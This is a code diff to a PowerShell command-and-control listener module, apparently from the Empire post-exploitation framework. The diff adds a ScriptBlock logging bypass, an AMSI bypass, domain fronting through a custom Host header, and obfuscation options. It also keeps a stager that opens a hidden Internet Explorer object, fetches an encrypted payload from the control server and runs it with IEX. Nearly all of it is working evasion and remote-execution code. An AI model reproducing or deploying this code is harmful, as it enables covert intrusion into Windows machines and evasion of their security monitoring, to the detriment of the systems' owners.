@@ -2,8 +2,10 @@ import logging
 import base64
 import random
 import os
+import ssl
 import time
 import copy
+import sys
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
 
@@ -24,8 +26,8 @@ class Listener:
 
             'Author': ['@harmj0y'],
 
-            'Description': ('Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach '
-                            'using a hidden Internet Explorer COM object.'),
+            'Description': ('Starts a http[s] listener (PowerShell only) that uses a GET/POST approach '
+                            'using a hidden Internet Explorer COM object. If using HTTPS, valid certificate required.'),
 
             'Category' : ('client_server'),
 
@@ -102,10 +104,25 @@ class Listener:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'RequestHeader' : {
+                'Description'   :   'Cannot use Cookie header, choose a different HTTP request header for comms.',
+                'Required'      :   True,
+                'Value'         :   'CF-RAY'
+            },
             'ServerVersion' : {
                 'Description'   :   'Server header for the control server.',
                 'Required'      :   True,
                 'Value'         :   'Microsoft-IIS/7.5'
+            },
+            'SlackToken' : {
+                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SlackChannel' : {
+                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
+                'Required'      :   False,
+                'Value'         :   '#general'
             }
         }
 
@@ -147,7 +164,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -163,20 +180,47 @@ class Listener:
             launcher = listenerOptions['Launcher']['Value']
             stagingKey = listenerOptions['StagingKey']['Value']
             profile = listenerOptions['DefaultProfile']['Value']
+            requestHeader = listenerOptions['RequestHeader']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
+            customHeaders = profile.split('|')[2:]
 
             if language.startswith('po'):
                 # PowerShell
 
-                stager = ''
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
+                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+
+                    # ScriptBlock Logging bypass
+                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
+                    stager += "'System.Management.Automation.Utils'"
+                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
+                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
+                    stager += "['ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("){$GPC")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    stager += "('EnableScriptB'+'lockLogging',0);"
+                    stager += helpers.randomize_capitalization("$val.Add")
+                    stager += "('EnableScriptBlockInvocationLogging',0);"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("=$val}")
+                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+                    stager += "'signatures','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
+
                     # @mattifestation's AMSI bypass
-                    stager = helpers.randomize_capitalization("[Ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.AmsiUtils'"
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 # TODO: reimplement stager retries?
@@ -203,10 +247,31 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                # add the RC4 packet to a header location
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
                 stager += "$ser='%s';$t='%s';" % (host, stage0)
-                stager += "$ie.navigate2($ser+$t,$fl,0,$Null,'CF-RAY: %s');"  % (b64RoutingPacket)
+
+                # add the RC4 packet to a header location
+                stager += "$c=\"%s: %s" % (requestHeader, b64RoutingPacket)
+
+                #Add custom headers if any
+                modifyHost = False
+                if customHeaders != []:
+                    for header in customHeaders:
+                        headerKey = header.split(':')[0]
+                        headerValue = header.split(':')[1]
+                        
+                        if headerKey.lower() == "host":
+                            modifyHost = True
+
+                        stager += "`r`n%s: %s" % (headerKey, headerValue)
+
+                stager += "\";"
+                #If host header defined, assume domain fronting is in use and add a call to the base URL first
+                #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+                if modifyHost:
+                    stager += helpers.randomize_capitalization("$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};")
+                
+                stager += "$ie.navigate2($ser+$t,$fl,0,$Null,$c);"
                 stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
                 stager += "$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;"
                 stager += "try {$data=[System.Convert]::FromBase64String($ht)} catch {$Null}"
@@ -215,8 +280,10 @@ class Listener:
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
+                if obfuscate:
+                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
-                if encode:
+                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
@@ -229,7 +296,7 @@ class Listener:
             print helpers.color("[!] listeners/http_com generate_launcher(): invalid listener name specification!")
 
 
-    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
+    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
         """
         Generate the stager code needed for communications with this listener.
         """
@@ -242,6 +309,8 @@ class Listener:
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
+        customHeaders = profile.split('|')[2:]
         
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
@@ -258,11 +327,31 @@ class Listener:
             if not host.endswith("/"):
                 host += "/"
 
+            #Patch in custom Headers
+            headers = ""
+            if customHeaders != []:
+                crlf = False
+                for header in customHeaders:
+                    headerKey = header.split(':')[0]
+                    headerValue = header.split(':')[1]
+
+                    # Host header TLS SNI logic done within http_com.ps1
+                    if crlf:
+                        headers += "`r`n"
+                    else:
+                        crlf = True
+                    headers += "%s: %s" % (headerKey, headerValue)
+                stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
+
             # patch the server and key information
             stager = stager.replace('REPLACE_SERVER', host)
             stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
             stager = stager.replace('index.jsp', stage1)
             stager = stager.replace('index.php', stage2)
+
+            #patch in working hours, if any
+            if workingHours != "":
+                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
 
             randomizedStager = ''
 
@@ -276,6 +365,8 @@ class Listener:
                     else:
                         randomizedStager += line
 
+            if obfuscate:
+                randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager, obfuscationCommand=obfuscationCommand)
             # base64 encode the stager and return it
             if encode:
                 return helpers.enc_powershell(randomizedStager)
@@ -290,7 +381,7 @@ class Listener:
             print helpers.color("[!] listeners/http_com generate_stager(): invalid language specification, only 'powershell' is current supported for this module.")
 
 
-    def generate_agent(self, listenerOptions, language=None):
+    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
         """
         Generate the full agent code needed for communications with this listener.
         """
@@ -305,7 +396,6 @@ class Listener:
         profile = listenerOptions['DefaultProfile']['Value']
         lostLimit = listenerOptions['DefaultLostLimit']['Value']
         killDate = listenerOptions['KillDate']['Value']
-        workingHours = listenerOptions['WorkingHours']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response())
 
         if language == 'powershell':
@@ -331,9 +421,8 @@ class Listener:
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
-            if workingHours != "":
-                code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
-
+            if obfuscate:
+                code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
             return code
 
         else:
@@ -373,7 +462,8 @@ class Listener:
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
-                                $Headers = "CF-RAY: $RoutingCookie"
+                                $Headers = "%s: $RoutingCookie"
+                                $script:Headers.GetEnumerator()| %%{ $Headers += "`r`n$($_.Name): $($_.Value)" }
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
@@ -396,7 +486,7 @@ class Listener:
                             }
                         }
                     }
-                """
+                """ % (listenerOptions['RequestHeader']['Value'])
 
                 sendMessage = """
                     function script:Send-Message {
@@ -414,16 +504,24 @@ class Listener:
 
                             if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
 
+                                $Headers = ""
+                                $script:Headers.GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
+                                $Headers.TrimStart("`r`n")
+                                
                                 try {
                                     # choose a random valid URI for checkin
                                     $taskURI = $script:TaskURIs | Get-Random
                                     $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI
 
-                                    $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Null)
+                                    $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Headers)
                                     while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                        # restart key negotiation
+                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
+                                    }
                                 }
                             }
                         }
@@ -496,11 +594,11 @@ class Listener:
             clientIP = request.remote_addr
             dispatcher.send("[*] GET request for %s/%s from %s" % (request.host, request_uri, clientIP), sender='listeners/http_com')
             routingPacket = None
-            cfRay = request.headers.get('CF-RAY')
-            if cfRay and cfRay != '':
+            reqHeader = request.headers.get(listenerOptions['RequestHeader']['Value'])
+            if reqHeader and reqHeader != '':
                 try:
-                    # decode the routing packet base64 value from the cfRay header location
-                    routingPacket = base64.b64decode(cfRay)
+                    # decode the routing packet base64 value from the custom HTTP request header location
+                    routingPacket = base64.b64decode(reqHeader)
                 except Exception as e:
                     routingPacket = None
 
@@ -515,7 +613,7 @@ class Listener:
 
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
                                 dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http_com')
-                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions)
+                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                                 return make_response(base64.b64encode(stage), 200)
 
                             elif results.startswith('ERROR:'):
@@ -570,7 +668,7 @@ class Listener:
                             dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, clientIP), sender='listeners/http_com')
 
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
-                            agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions)
+                            agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                             encrypted_agent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                             # TODO: wrap ^ in a routing packet?
 
@@ -593,7 +691,19 @@ class Listener:
             certPath = listenerOptions['CertPath']['Value']
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
-                context = ("%s/data/empire.pem" % (self.mainMenu.installPath), "%s/data/empire.pem"  % (self.mainMenu.installPath))
+                certPath = os.path.abspath(certPath)
+
+                # support any version of tls
+                pyversion = sys.version_info
+                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
+                    proto = ssl.PROTOCOL_TLS
+                elif pyversion[0] >= 3:
+                    proto = ssl.PROTOCOL_TLS
+                else:
+                    proto = ssl.PROTOCOL_SSLv23
+
+                context = ssl.SSLContext(proto)
+                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
